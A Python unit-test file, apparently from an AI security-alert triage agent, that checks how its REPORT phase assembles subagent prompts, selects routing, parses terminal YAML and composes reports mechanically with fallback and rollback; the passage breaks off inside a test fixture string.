"""Unit tests for the REPORT phase handler.

The subagent invocation is mocked — these tests exercise prompt assembly,
routing selection (analyze / screen / forced_exhaustion), terminal YAML
parsing, and error propagation. They do not spawn a Claude subprocess.
"""

import sys
import textwrap
from pathlib import Path

import pytest

SOC_AGENT_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(SOC_AGENT_ROOT))

from schemas.state import Phase  # noqa: E402
from scripts.handlers import report as report_handler  # noqa: E402
from scripts.orchestrate import Context, OrchestrationError, PhaseResult, run  # noqa: E402
from tests._dense_fixture_helpers import companion_to_invlang_fence  # noqa: E402


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


def make_ctx(
    tmp_path: Path,
    *,
    ticket_id: str = "SEC-2026-042",
    contextualize: dict | None = None,
    analyze: dict | None = None,
    screen: dict | None = None,
    forced_report: bool = False,
    investigation_md: str = "## CONTEXTUALIZE\n\nalert observed.\n",
) -> Context:
    run_dir = tmp_path / "run-test"
    run_dir.mkdir()
    # alert.json + investigation.md + meta.json are now pre-loaded by the
    # handler into the prompt (alert + per-run salt), so all must exist on disk.
    alert = {"id": "alert-1", "rule": {"id": "5710"}, "data": {}}
    import json as _json
    (run_dir / "alert.json").write_text(_json.dumps(alert))
    (run_dir / "investigation.md").write_text(investigation_md)
    (run_dir / "meta.json").write_text(_json.dumps({"salt": "test-salt"}))
    outputs: dict[Phase, dict] = {}
    if contextualize is not None:
        outputs[Phase.CONTEXTUALIZE] = contextualize
    if analyze is not None:
        outputs[Phase.ANALYZE] = analyze
    if screen is not None:
        outputs[Phase.SCREEN] = screen
    return Context(
        run_dir=run_dir,
        signature_id="wazuh-rule-5710",
        ticket_id=ticket_id,
        alert=alert,
        outputs=outputs,
        forced_report=forced_report,
    )


def _prepare_run_dir(run_dir: Path, *, investigation_md: str = "## CONTEXTUALIZE\n\nalert observed.\n") -> None:
    """Create alert.json + investigation.md + meta.json on disk so the
    handler's preloaded prompt assembly doesn't error. Kept small — tests
    that need specific alert content or investigation shape override per-call."""
    import json as _json
    alert = {"id": "alert-1", "rule": {"id": "5710"}, "data": {}}
    run_dir.mkdir(exist_ok=True)
    (run_dir / "alert.json").write_text(_json.dumps(alert))
    (run_dir / "investigation.md").write_text(investigation_md)
    (run_dir / "meta.json").write_text(_json.dumps({"salt": "test-salt"}))


def stub_invoke(captured: list[str], response: str):
    """Return a replacement for _invoke_subagent that records prompts and
    returns canned output."""
    def fn(prompt, *, timeout=None):
        captured.append(prompt)
        return response
    return fn


@pytest.fixture(autouse=True)
def _default_shared_invoke_stub(monkeypatch):
    """Autouse safety net so unit tests don't spawn real `claude` subprocesses.

    Two seams stubbed:
      - `_invoke_archetype_match` → null match by default; tests that exercise
        a non-null match or a dispatch failure override this attribute.
      - `_shared_invoke` (the narrative call site at `report_narrative`)
        → raises; narrative tests override with a fake that handles the
        `report_narrative` agent name.
    """
    def _default_archetype(_prompt, *, timeout=None, session_id=None):
        return "```yaml\nmatched_archetype: null\njustification: default test stub\n```"

    def _default_shared(agent, _prompt, *, model=None, timeout=None):
        raise AssertionError(
            f"_shared_invoke called for agent {agent!r} but no per-test stub "
            f"was installed — add monkeypatch.setattr(report_handler, "
            f"'_shared_invoke', ...) in the test"
        )
    monkeypatch.setattr(report_handler, "_invoke_archetype_match", _default_archetype)
    monkeypatch.setattr(report_handler, "_shared_invoke", _default_shared)


# ---------------------------------------------------------------------------
# Prompt assembly
# ---------------------------------------------------------------------------


class TestPromptAssembly:
    def test_prompt_inlines_alert_investigation_archetypes_with_precedents(self, tmp_path, monkeypatch):
        """Non-forced path preloads alert + investigation + archetype shapes
        with precedents into the prompt so the subagent needs no Read/Glob."""
        ctx = make_ctx(
            tmp_path,
            analyze={"disposition": "benign", "matched_archetype": "monitoring-probe"},
            investigation_md="## CONTEXTUALIZE\n\nsignature analysis.\n\n## ANALYZE (loop 1)\n\nrouting.\n",
        )
        captured: list[str] = []
        response = textwrap.dedent("""
        ```yaml
        status: written
        report_path: /tmp/report.md
        disposition: benign
        confidence: high
        matched_archetype: monitoring-probe
        status_frontmatter: resolved
        ```
        """).strip()
        monkeypatch.setattr(report_handler, "_invoke_subagent", stub_invoke(captured, response))
        report_handler.handle(ctx)
        prompt = captured[0]
        # All three tagged blocks present (alert tag is salted)
        assert "<alert-test-salt>" in prompt and "</alert-test-salt>" in prompt
        assert "<investigation>" in prompt and "signature analysis" in prompt
        assert "<archetypes>" in prompt
        # Matched archetype shape inlined
        assert 'name="monitoring-probe"' in prompt
        # Precedents surfaced (5710/monitoring-probe ships SEC-2024-001)
        assert "SEC-2024-001" in prompt

    def test_prompt_omits_archetypes_on_forced_exhaustion(self, tmp_path, monkeypatch):
        """Forced-exhaustion emits matched_archetype=null by contract, so
        loading archetype shapes + precedents is wasted prompt tokens. Block
        must be absent."""
        ctx = make_ctx(tmp_path, forced_report=True)
        captured: list[str] = []
        response = textwrap.dedent("""
        ```yaml
        status: written
        report_path: /tmp/report.md
        disposition: unclear
        confidence: low
        matched_archetype: null
        status_frontmatter: escalated
        ```
        """).strip()
        monkeypatch.setattr(report_handler, "_invoke_subagent", stub_invoke(captured, response))
        report_handler.handle(ctx)
        prompt = captured[0]
        assert "<alert-test-salt>" in prompt
        assert "<investigation>" in prompt
        assert "<archetypes>" not in prompt
        assert "<archetype " not in prompt

    def test_analyze_routing_passes_core_fields(self, tmp_path, monkeypatch):
        ctx = make_ctx(
            tmp_path,
            contextualize={},
            analyze={"disposition": "benign", "matched_archetype": "monitoring-probe"},
        )
        captured: list[str] = []
        response = textwrap.dedent("""
        ```yaml
        status: written
        report_path: /tmp/report.md
        disposition: benign
        confidence: high
        matched_archetype: monitoring-probe
        status_frontmatter: resolved
        ```
        """).strip()
        monkeypatch.setattr(report_handler, "_invoke_subagent", stub_invoke(captured, response))

        report_handler.handle(ctx)
        prompt = captured[0]

        assert f"run_dir={ctx.run_dir}" in prompt
        assert "signature_id=wazuh-rule-5710" in prompt
        assert "identifier=SEC-2026-042" in prompt
        assert "routing_source=analyze" in prompt
        assert "forced_exhaustion" not in prompt

    def test_screen_routing_selected_when_only_screen_output_present(
        self, tmp_path, monkeypatch
    ):
        ctx = make_ctx(
            tmp_path,
            contextualize={},
            screen={"screen_result": "match", "matched_archetype": "monitoring-probe"},
        )
        captured: list[str] = []
        response = textwrap.dedent("""
        ```yaml
        status: written
        report_path: /tmp/report.md
        disposition: benign
        confidence: high
        matched_archetype: monitoring-probe
        status_frontmatter: resolved
        ```
        """).strip()
        monkeypatch.setattr(report_handler, "_invoke_subagent", stub_invoke(captured, response))

        report_handler.handle(ctx)
        assert "routing_source=screen" in captured[0]

    def test_contextualize_dedup_falls_through_to_forced_exhaustion(self, tmp_path, monkeypatch):
        """Dedup fast-path is retired (tasks/dedup-fast-path.md). A
        CONTEXTUALIZE payload with `dedup=True` is no longer produced by the
        handler, but even if it were, the REPORT routing source selector
        must not treat it as screen. With no SCREEN or ANALYZE output, this
        case falls through to `forced_exhaustion` (telemetry-only shape that
        an operator can investigate)."""
        ctx = make_ctx(
            tmp_path,
            contextualize={"dedup": True},
        )
        captured: list[str] = []
        response = textwrap.dedent("""
        ```yaml
        status: written
        report_path: /tmp/report.md
        disposition: unclear
        confidence: low
        matched_archetype: null
        status_frontmatter: escalated
        ```
        """).strip()
        monkeypatch.setattr(report_handler, "_invoke_subagent", stub_invoke(captured, response))

        report_handler.handle(ctx)
        assert "routing_source=forced_exhaustion" in captured[0]
        assert "forced_exhaustion=true" in captured[0]

    def test_forced_exhaustion_when_no_upstream_terminal_payload(
        self, tmp_path, monkeypatch
    ):
        ctx = make_ctx(
            tmp_path,
            contextualize={},
            forced_report=True,
        )
        captured: list[str] = []
        response = textwrap.dedent("""
        ```yaml
        status: written
        report_path: /tmp/report.md
        disposition: unclear
        confidence: low
        matched_archetype: null
        status_frontmatter: escalated
        ```
        """).strip()
        monkeypatch.setattr(report_handler, "_invoke_subagent", stub_invoke(captured, response))

        report_handler.handle(ctx)
        prompt = captured[0]
        assert "routing_source=forced_exhaustion" in prompt
        assert "forced_exhaustion=true" in prompt

    def test_missing_ticket_id_raises(self, tmp_path):
        ctx = make_ctx(tmp_path, ticket_id="", contextualize={})
        with pytest.raises(OrchestrationError, match="ticket_id"):
            report_handler.handle(ctx)

    def test_fallback_subagent_receives_resolved_matched_archetype(
        self, tmp_path, monkeypatch,
    ):
        """When the mechanical ANALYZE composer can't run (missing required
        fields in the ANALYZE payload) the handler falls through to the
        subagent. The subagent prompt must carry `matched_archetype=<name>`
        from the archetype-match dispatch — ANALYZE no longer emits this
        field, so without caller-substitution the fallback subagent would
        fabricate null."""
        # Omit `confidence` so the mechanical composer bails to fallback.
        ctx = make_ctx(
            tmp_path,
            analyze={"disposition": "benign"},
        )

        def fake_archetype(_prompt, *, timeout=None, session_id=None):
            return (
                "```yaml\nmatched_archetype: monitoring-probe\n"
                "justification: resolved at REPORT time\n```"
            )

        monkeypatch.setattr(report_handler, "_invoke_archetype_match", fake_archetype)

        captured: list[str] = []
        response = textwrap.dedent("""
        ```yaml
        status: written
        report_path: /tmp/report.md
        disposition: benign
        confidence: high
        matched_archetype: monitoring-probe
        status_frontmatter: resolved
        ```
        """).strip()
        monkeypatch.setattr(
            report_handler, "_invoke_subagent", stub_invoke(captured, response),
        )

        report_handler.handle(ctx)
        assert "matched_archetype=monitoring-probe" in captured[0]
        assert "routing_source=analyze" in captured[0]

    def test_fallback_subagent_receives_null_archetype_on_forced_exhaustion(
        self, tmp_path, monkeypatch,
    ):
        """Forced-exhaustion must not dispatch archetype-match — the prompt
        carries `matched_archetype=null` verbatim per contract."""
        ctx = make_ctx(tmp_path, forced_report=True)
        captured: list[str] = []
        response = textwrap.dedent("""
        ```yaml
        status: written
        report_path: /tmp/report.md
        disposition: unclear
        confidence: low
        matched_archetype: null
        status_frontmatter: escalated
        ```
        """).strip()
        monkeypatch.setattr(
            report_handler, "_invoke_subagent", stub_invoke(captured, response),
        )
        report_handler.handle(ctx)
        assert "matched_archetype=null" in captured[0]

    def test_archetype_match_dispatch_failure_surfaced_on_payload(
        self, tmp_path, monkeypatch,
    ):
        """When archetype-match raises (subprocess failure, timeout), the
        handler still emits a report but annotates the payload so operators
        can triage the dispatch failure. Distinct from a legitimate null
        match, which is silent."""
        # Omit `confidence` so the mechanical path bails, isolating the
        # archetype-match dispatch failure from mechanical-composer errors.
        ctx = make_ctx(
            tmp_path,
            analyze={"disposition": "benign"},
        )

        def broken_archetype(_prompt, *, timeout=None, session_id=None):
            raise OrchestrationError("claude subprocess timed out")

        monkeypatch.setattr(report_handler, "_invoke_archetype_match", broken_archetype)

        response = textwrap.dedent("""
        ```yaml
        status: written
        report_path: /tmp/report.md
        disposition: unclear
        confidence: low
        matched_archetype: null
        status_frontmatter: escalated
        ```
        """).strip()
        monkeypatch.setattr(
            report_handler, "_invoke_subagent", stub_invoke([], response),
        )

        result = report_handler.handle(ctx)
        assert "archetype_match_failure_reason" in result.payload
        assert "timed out" in result.payload["archetype_match_failure_reason"]

    def test_legitimate_null_match_is_silent_on_payload(
        self, tmp_path, monkeypatch,
    ):
        """A null match returned cleanly by archetype-match (catalog didn't
        cover this outcome) is not a failure — no telemetry annotation."""
        ctx = make_ctx(
            tmp_path,
            analyze={"disposition": "benign"},  # bails mechanical, exercises fallback
        )

        def null_match_archetype(_prompt, *, timeout=None, session_id=None):
            return "```yaml\nmatched_archetype: null\njustification: no fit\n```"

        monkeypatch.setattr(report_handler, "_invoke_archetype_match", null_match_archetype)

        response = textwrap.dedent("""
        ```yaml
        status: written
        report_path: /tmp/report.md
        disposition: unclear
        confidence: low
        matched_archetype: null
        status_frontmatter: escalated
        ```
        """).strip()
        monkeypatch.setattr(
            report_handler, "_invoke_subagent", stub_invoke([], response),
        )

        result = report_handler.handle(ctx)
        assert "archetype_match_failure_reason" not in result.payload


# ---------------------------------------------------------------------------
# Terminal YAML parsing
# ---------------------------------------------------------------------------


class TestOutputParsing:
    def _setup(self, tmp_path, monkeypatch, response: str):
        ctx = make_ctx(
            tmp_path,
            contextualize={},
            analyze={"disposition": "benign"},
        )
        monkeypatch.setattr(
            report_handler, "_invoke_subagent", stub_invoke([], response)
        )
        return ctx

    def test_written_payload_parsed(self, tmp_path, monkeypatch):
        response = textwrap.dedent("""
        Some preamble the subagent shouldn't emit but we tolerate.

        ```yaml
        status: written
        report_path: /runs/abc/report.md
        disposition: benign
        confidence: high
        matched_archetype: monitoring-probe
        status_frontmatter: resolved
        ```
        """).strip()
        ctx = self._setup(tmp_path, monkeypatch, response)

        result = report_handler.handle(ctx)

        assert result.next_phase == Phase.REPORT
        assert result.payload["status"] == "written"
        assert result.payload["report_path"] == "/runs/abc/report.md"
        assert result.payload["disposition"] == "benign"
        assert result.payload["matched_archetype"] == "monitoring-probe"

    def test_gate_failed_passthrough(self, tmp_path, monkeypatch):
        response = textwrap.dedent("""
        ```yaml
        status: gate_failed
        failure:
          stage: validate_report_precheck
          reason: "Judge A flagged: PLUS_PLUS_FALSIFICATION not satisfied"
        ```
        """).strip()
        ctx = self._setup(tmp_path, monkeypatch, response)

        result = report_handler.handle(ctx)

        assert result.payload["status"] == "gate_failed"
        assert result.payload["failure"]["stage"] == "validate_report_precheck"
        assert "Judge A flagged" in result.payload["failure"]["reason"]

    def test_error_status_propagated(self, tmp_path, monkeypatch):
        response = textwrap.dedent("""
        ```yaml
        status: error
        reason: "investigation.md not found"
        ```
        """).strip()
        ctx = self._setup(tmp_path, monkeypatch, response)

        result = report_handler.handle(ctx)
        assert result.payload["status"] == "error"
        assert "investigation.md" in result.payload["reason"]

    def test_last_yaml_block_wins(self, tmp_path, monkeypatch):
        """If the subagent emits multiple yaml blocks, the last one is terminal."""
        response = textwrap.dedent("""
        ```yaml
        # intermediate block, should be ignored
        status: written
        report_path: /wrong/path
        disposition: true_positive
        confidence: low
        matched_archetype: null
        status_frontmatter: escalated
        ```

        some narration

        ```yaml
        status: written
        report_path: /correct/path
        disposition: benign
        confidence: high
        matched_archetype: monitoring-probe
        status_frontmatter: resolved
        ```
        """).strip()
        ctx = self._setup(tmp_path, monkeypatch, response)

        result = report_handler.handle(ctx)
        assert result.payload["report_path"] == "/correct/path"
        assert result.payload["disposition"] == "benign"

    def test_missing_yaml_block_raises(self, tmp_path, monkeypatch):
        ctx = self._setup(tmp_path, monkeypatch, "no fenced yaml here at all")
        with pytest.raises(OrchestrationError, match="no terminal YAML"):
            report_handler.handle(ctx)

    def test_unknown_status_raises(self, tmp_path, monkeypatch):
        response = textwrap.dedent("""
        ```yaml
        status: bogus
        ```
        """).strip()
        ctx = self._setup(tmp_path, monkeypatch, response)
        with pytest.raises(OrchestrationError, match="unknown status"):
            report_handler.handle(ctx)

    def test_non_mapping_yaml_raises(self, tmp_path, monkeypatch):
        response = textwrap.dedent("""
        ```yaml
        - just
        - a
        - list
        ```
        """).strip()
        ctx = self._setup(tmp_path, monkeypatch, response)
        with pytest.raises(OrchestrationError, match="not a mapping"):
            report_handler.handle(ctx)


# ---------------------------------------------------------------------------
# Orchestrator integration
# ---------------------------------------------------------------------------


class TestOrchestratorIntegration:
    """End-to-end test of the handler wired into run() — verifies the
    orchestrator dispatches the REPORT handler before returning, and
    that the payload lands in the run summary's outputs map."""

    def test_report_handler_runs_before_terminal_return(self, tmp_path, monkeypatch):
        run_dir = tmp_path / "run-1"
        _prepare_run_dir(run_dir)
        ctx = Context(
            run_dir=run_dir,
            signature_id="wazuh-rule-5710",
            ticket_id="SEC-2026-042",
            alert={"id": "alert-1"},
        )

        def ctx_handler(c):
            # Structural test — confirms the orchestrator dispatches the
            # REPORT handler when an upstream phase routes there.
            # CONTEXTUALIZE→REPORT remains a legal edge in TRANSITIONS
            # even though the live handler no longer routes on dedup.
            return PhaseResult(
                next_phase=Phase.REPORT,
                payload={"dedup": False},
            )

        response = textwrap.dedent("""
        ```yaml
        status: written
        report_path: /runs/run-1/report.md
        disposition: benign
        confidence: medium
        matched_archetype: null
        status_frontmatter: resolved
        ```
        """).strip()
        monkeypatch.setattr(
            report_handler, "_invoke_subagent", stub_invoke([], response)
        )

        handlers = {
            Phase.CONTEXTUALIZE: ctx_handler,
            Phase.REPORT: report_handler.handle,
        }

        result = run(ctx, handlers)

        assert result["status"] == "complete"
        assert result["history"] == ["CONTEXTUALIZE", "REPORT"]
        assert result["outputs"]["REPORT"]["status"] == "written"
        assert result["outputs"]["REPORT"]["report_path"] == "/runs/run-1/report.md"

    def test_report_handler_runs_on_forced_report(self, tmp_path, monkeypatch):
        """When MAX_LOOPS forces REPORT, the handler still runs and receives
        a ctx with no ANALYZE/SCREEN outputs (forced-exhaustion path)."""
        run_dir = tmp_path / "run-forced"
        _prepare_run_dir(run_dir)
        ctx = Context(
            run_dir=run_dir,
            signature_id="wazuh-rule-5710",
            ticket_id="SEC-2026-042",
            alert={"id": "alert-1"},
        )

        captured: list[str] = []
        response = textwrap.dedent("""
        ```yaml
        status: written
        report_path: /runs/run-forced/report.md
        disposition: unclear
        confidence: low
        matched_archetype: null
        status_frontmatter: escalated
        ```
        """).strip()
        monkeypatch.setattr(
            report_handler, "_invoke_subagent", stub_invoke(captured, response)
        )

        def ctx_handler(_c):
            return PhaseResult(
                next_phase=Phase.PREDICT,
                payload={},
            )

        handlers = {
            Phase.CONTEXTUALIZE: ctx_handler,
            Phase.PREDICT: lambda _c: PhaseResult(next_phase=Phase.GATHER),
            Phase.GATHER: lambda _c: PhaseResult(next_phase=Phase.ANALYZE),
            # ANALYZE never routes to REPORT — bounces back to PREDICT
            # until MAX_LOOPS is hit and orchestrator forces REPORT.
            Phase.ANALYZE: lambda _c: PhaseResult(next_phase=Phase.PREDICT),
            Phase.REPORT: report_handler.handle,
        }

        result = run(ctx, handlers)

        assert result["status"] == "forced_report"
        assert result["history"][-1] == "REPORT"
        # Subagent prompt should reflect forced-exhaustion since ANALYZE
        # never produced a terminal payload.
        prompt = captured[0]
        assert "routing_source=forced_exhaustion" in prompt
        assert "forced_exhaustion=true" in prompt
        assert result["outputs"]["REPORT"]["status_frontmatter"] == "escalated"


# ---------------------------------------------------------------------------
# Mechanical REPORT composer (SCREEN-match fast-path)
# ---------------------------------------------------------------------------


def _seed_ctx_for_mechanical(tmp_path: Path, *, matched_ticket_id: str | None) -> Context:
    """Build a ctx with a SCREEN payload complete enough to trigger the
    mechanical REPORT composer."""
    run_dir = tmp_path / "run-mech"
    run_dir.mkdir()
    # Seed alert.json + meta.json for the preload path (even though
    # mechanical compose doesn't invoke the subagent, assembling a ctx that
    # validates cleanly means fallback paths still work).
    import json as _json
    (run_dir / "alert.json").write_text(
        _json.dumps({"id": "alert-1", "rule": {"id": "5710"}, "data": {}})
    )
    (run_dir / "meta.json").write_text(_json.dumps({"salt": "test-salt"}))
    # Seed investigation.md with a minimal prologue so the mechanical path's
    # investigation.md append produces valid cumulative text.
    (run_dir / "investigation.md").write_text(
        "## CONTEXTUALIZE\n\n"
        "**Alert:** SEC-2026-042 — wazuh-rule-5710\n\n"
        "```yaml\n"
        "prologue:\n"
        "  vertices:\n"
        "  - id: v-001\n"
        "    type: endpoint\n"
        "    classification: internal-monitoring-host\n"
        "    identifier: 172.22.0.10\n"
        "  edges: []\n"
        "```\n"
    )
    screen_payload = {
        "screen_result": "match",
        "matched_pattern": "monitoring-probe fast-path",
        "matched_archetype": "monitoring-probe",
        "matched_ticket_id": matched_ticket_id,
        "disposition": "benign",
        "confidence": "high",
        "evidence_summary": "approved source, single attempt, no successful login follow-up",
        "leads_run": [
            {"lead": "source-classification", "observation": "172.22.0.10 -> internal-monitoring-host"},
            {"lead": "username-classification", "observation": "nagios -> monitoring-pattern"},
            {
                "lead": "approved-monitoring-sources",
                "observation": "(172.22.0.10, nagios, target-endpoint) -> authorized",
            },
            {
                "lead": "authentication-history",
                "observation": "cluster_count=1, no successful logins after",
            },
        ],
        "findings": [
            {
                "id": "l-001", "loop": 0, "name": "source-classification",
                "target": "v-001", "mode": "screen",
                "outcome": {"attribute_updates": [{"target": "v-001", "updates": {"classification": "internal-monitoring-host"}}]},
            },
            {
                "id": "l-003", "loop": 0, "name": "approved-monitoring-sources",
                "target": "e-001", "mode": "screen",
                "outcome": {
                    "anchor_consultations": [{
                        "anchor_id": "approved-monitoring-sources",
                        "anchor_kind": "approved-monitoring-sources",
                        "grounding_kind": "org-authority",
                        "result": "confirmed",
                        "as_of": "2026-04-20T19:25:01Z",
                        "authority_for_question": "full",
                    }],
                },
            },
        ],
    }
    return Context(
        run_dir=run_dir,
        signature_id="wazuh-rule-5710",
        ticket_id="1776748918.3300232",
        alert={"id": "1776748918.3300232"},
        outputs={Phase.SCREEN: screen_payload},
    )


class TestMechanicalScreenCompose:
    def test_mechanical_path_skips_subagent_and_writes_report(
        self, tmp_path, monkeypatch,
    ):
        ctx = _seed_ctx_for_mechanical(tmp_path, matched_ticket_id="SEC-2024-001")
        captured: list[str] = []
        monkeypatch.setattr(
            report_handler, "_invoke_subagent", stub_invoke(captured, "UNEXPECTED"),
        )

        result = report_handler.handle(ctx)

        # Subagent must not be called on the mechanical fast-path.
        assert captured == []
        assert result.next_phase == Phase.REPORT
        assert result.payload["status"] == "written"
        assert result.payload["compose_mode"] == "screen_mechanical_grounded"
        assert result.payload["matched_archetype"] == "monitoring-probe"
        assert result.payload["status_frontmatter"] == "resolved"

        report_path = ctx.run_dir / "report.md"
        assert report_path.exists()
        report = report_path.read_text()
        # Frontmatter grounds on the precedent.
        assert 'matched_ticket_id: SEC-2024-001' in report
        # Wazuh ids contain a dot; yaml.safe_dump single-quotes them so they
        # aren't parsed as floats when the frontmatter is re-read.
        assert "1776748918.3300232" in report
        assert "ticket_id: '1776748918.3300232'" in report
        assert "status: resolved" in report
        assert "## Summary" in report
        assert "## Investigation Trace" in report
        assert "## Hypothesis Outcomes" in report
        assert "## Key Evidence" in report
        assert "## Verdict" in report
        # No For Analyst section on resolved.
        assert "## For Analyst" not in report

        # investigation.md carries the REPORT markdown + dense :T conclude block.
        inv = (ctx.run_dir / "investigation.md").read_text()
        assert "## REPORT" in inv
        assert ":T conclude" in inv
        assert "termination.category" in inv and "trust-root" in inv

    def test_mechanical_path_falls_back_to_anchor_leg_when_precedent_missing(
        self, tmp_path, monkeypatch,
    ):
        """SCREEN claimed a matched_ticket_id that does not exist on disk.
        Handler must drop the precedent cite and ground via the anchor leg."""
        ctx = _seed_ctx_for_mechanical(tmp_path, matched_ticket_id="SEC-9999-999")
        monkeypatch.setattr(
            report_handler, "_invoke_subagent", stub_invoke([], "UNEXPECTED"),
        )
        result = report_handler.handle(ctx)
        assert result.payload["status"] == "written"
        assert result.payload["status_frontmatter"] == "resolved"
        # Report frontmatter has matched_ticket_id: null (anchor leg only).
        report = (ctx.run_dir / "report.md").read_text()
        assert "matched_ticket_id: null" in report

    def test_level_2_partial_grounding_escalates_mechanically(
        self, tmp_path, monkeypatch,
    ):
        """Archetype exists but grounding is incomplete (precedent file
        missing AND anchor not confirmed). Handler composes mechanically at
        Level 2: status=escalated, SCREEN's disposition preserved, confidence
        clamped to medium. No subagent call, no raise."""
        ctx = _seed_ctx_for_mechanical(tmp_path, matched_ticket_id="SEC-9999-999")
        # Drop the confirmed anchor_consultations so the anchor leg also fails.
        screen = ctx.outputs[Phase.SCREEN]
        screen["findings"] = [
            {
                "id": "l-001", "loop": 0, "name": "source-classification",
                "target": "v-001", "mode": "screen",
                "outcome": {"attribute_updates": [{"target": "v-001", "updates": {"classification": "x"}}]},
            },
        ]
        captured: list[str] = []
        monkeypatch.setattr(
            report_handler, "_invoke_subagent", stub_invoke(captured, "UNEXPECTED"),
        )

        result = report_handler.handle(ctx)
        assert captured == []  # still mechanical, still no subagent
        assert result.payload["compose_mode"] == "screen_mechanical_partial"
        assert result.payload["status_frontmatter"] == "escalated"
        assert result.payload["disposition"] == "benign"  # SCREEN's call preserved
        assert result.payload["confidence"] == "medium"   # clamped from high

        report = (ctx.run_dir / "report.md").read_text()
        assert "status: escalated" in report
        assert "disposition: benign" in report
        assert "confidence: medium" in report
        # For Analyst section appears on escalated.
        assert "## For Analyst" in report
        # Rationale names the missing precedent.
        inv = (ctx.run_dir / "investigation.md").read_text()
        assert "grounding incomplete" in inv
        assert "SEC-9999-999" in inv

    def test_level_3_fallback_when_archetype_missing(
        self, tmp_path, monkeypatch,
    ):
        """Archetype directory does not exist → mechanical composer raises
        _MechanicalFallback; handler dispatches the conclude subagent with
        the fallback reason noted in the payload."""
        ctx = _seed_ctx_for_mechanical(tmp_path, matched_ticket_id="SEC-2024-001")
        # Point at a non-existent archetype.
        ctx.outputs[Phase.SCREEN]["matched_archetype"] = "does-not-exist-arch"

        captured: list[str] = []
        response = textwrap.dedent("""
        ```yaml
        status: written
        report_path: /tmp/report.md
        disposition: benign
        confidence: high
        matched_archetype: does-not-exist-arch
        status_frontmatter: escalated
        ```
        """).strip()
        monkeypatch.setattr(
            report_handler, "_invoke_subagent", stub_invoke(captured, response),
        )

        result = report_handler.handle(ctx)
        assert len(captured) == 1  # subagent dispatched
        assert result.payload["compose_mode"] == "subagent"
        assert "archetype dir missing" in result.payload["mechanical_fallback_reason"]

    def test_level_3_fallback_rolls_back_partial_writes(
        self, tmp_path, monkeypatch,
    ):
        """If Tier-1 validation fails on a mechanically-composed report, the
        handler rolls back the investigation.md append and the report.md
        write before falling back to the subagent. The subagent must see the
        run dir in its pre-mechanical state."""
        ctx = _seed_ctx_for_mechanical(tmp_path, matched_ticket_id="SEC-2024-001")
        inv_before = (ctx.run_dir / "investigation.md").read_text()

        # Force Tier-1 to always fail, simulating a schema-assumption violation.
        def fail_tier1(_path):
            from scripts.orchestrate import OrchestrationError
            raise OrchestrationError("simulated tier-1 rejection")
        monkeypatch.setattr(report_handler, "_run_tier1_validation", fail_tier1)

        response = textwrap.dedent("""
        ```yaml
        status: written
        report_path: /tmp/report.md
        disposition: benign
        confidence: high
        matched_archetype: monitoring-probe
        status_frontmatter: resolved
        ```
        """).strip()
        captured: list[str] = []
        monkeypatch.setattr(
            report_handler, "_invoke_subagent", stub_invoke(captured, response),
        )

        result = report_handler.handle(ctx)
        assert len(captured) == 1  # subagent was dispatched
        assert result.payload["compose_mode"] == "subagent"
        assert "Tier-1" in result.payload["mechanical_fallback_reason"]

        # Rollback invariants: investigation.md back to pre-mechanical text,
        # report.md deleted (the subagent would create it).
        assert (ctx.run_dir / "investigation.md").read_text() == inv_before
        assert not (ctx.run_dir / "report.md").exists()

    def test_subagent_still_used_when_screen_payload_incomplete(
        self, tmp_path, monkeypatch,
    ):
        """Missing gather block → mechanical composer gated off, handler
        dispatches the conclude subagent as before."""
        run_dir = tmp_path / "run-fallback"
        _prepare_run_dir(run_dir)
        ctx = Context(
            run_dir=run_dir,
            signature_id="wazuh-rule-5710",
            ticket_id="SEC-2026-042",
            alert={"id": "alert-1"},
            outputs={Phase.SCREEN: {
                "screen_result": "match",
                "matched_archetype": "monitoring-probe",
                # no gather key
            }},
        )
        captured: list[str] = []
        response = textwrap.dedent("""
        ```yaml
        status: written
        report_path: /runs/run-fallback/report.md
        disposition: benign
        confidence: high
        matched_archetype: monitoring-probe
        status_frontmatter: resolved
        ```
        """).strip()
        monkeypatch.setattr(
            report_handler, "_invoke_subagent", stub_invoke(captured, response),
        )
        result = report_handler.handle(ctx)
        assert captured != []  # subagent was called
        assert result.payload["compose_mode"] == "subagent"


# ---------------------------------------------------------------------------
# Mechanical REPORT composer (ANALYZE-routed path)
# ---------------------------------------------------------------------------


def _seed_ctx_for_analyze_mechanical(
    tmp_path: Path,
    *,
    analyze_payload: dict,
    investigation_md: str,
) -> Context:
    """Build a ctx with an ANALYZE payload + invlang-shaped investigation.md
    that the mechanical analyze composer can process."""
    run_dir = tmp_path / "run-mech-analyze"
    run_dir.mkdir()
    import json as _json
    (run_dir / "alert.json").write_text(
        _json.dumps({"id": "alert-1", "rule": {"id": "5710"}, "data": {}})
    )
    (run_dir / "meta.json").write_text(_json.dumps({"salt": "test-salt"}))
    (run_dir / "investigation.md").write_text(investigation_md)
    return Context(
        run_dir=run_dir,
        signature_id="wazuh-rule-5710",
        ticket_id="1776748918.3300232",
        alert={"id": "1776748918.3300232"},
        outputs={Phase.ANALYZE: analyze_payload},
    )


_INV_RESOLVED_ANCHOR = """## CONTEXTUALIZE

**Alert:** SEC-2026-042 — wazuh-rule-5710

```yaml
prologue:
  vertices:
  - id: v-001
    type: endpoint
    classification: internal-monitoring-host
  edges: []
```

## PREDICT (loop 1)

?monitoring-probe — approved cron probe.

```yaml
hypothesize:
  hypotheses:
  - id: h-001
    name: monitoring-probe
```

## GATHER (loop 1)

**Lead:** approved-monitoring-sources

```yaml
findings:
- id: l-001
  loop: 1
  name: source-classification
  target: v-001
  mode: screen
  outcome:
    attribute_updates:
    - target: v-001
      updates:
        classification: internal-monitoring-host
- id: l-002
  loop: 1
  name: approved-monitoring-sources
  target: e-001
  mode: screen
  outcome:
    anchor_consultations:
      - anchor_id: approved-monitoring-sources
        anchor_kind: approved-monitoring-sources
        grounding_kind: org-authority
        result: confirmed
        as_of: '2026-04-22T07:00:00Z'
        authority_for_question: full
    observations:
      edges:
        - id: e-001
          authorization_resolutions:
            - verdict: authorized
              anchor_id: approved-monitoring-sources
              anchor_kind: approved-monitoring-sources
              grounding_kind: org-authority
              authority_for_question: full
              as_of: '2026-04-22T07:00:00Z'
              resolved_by_lead: l-002
              fulfills_contract: h-001.ac1
    resolutions:
    - hypothesis: h-001
      weight: ++
```

## ANALYZE (loop 1)

**Assessment:**
- ?monitoring-probe (h-001): `++` — anchor confirmed authorized triple.

**Surviving hypotheses:** h-001

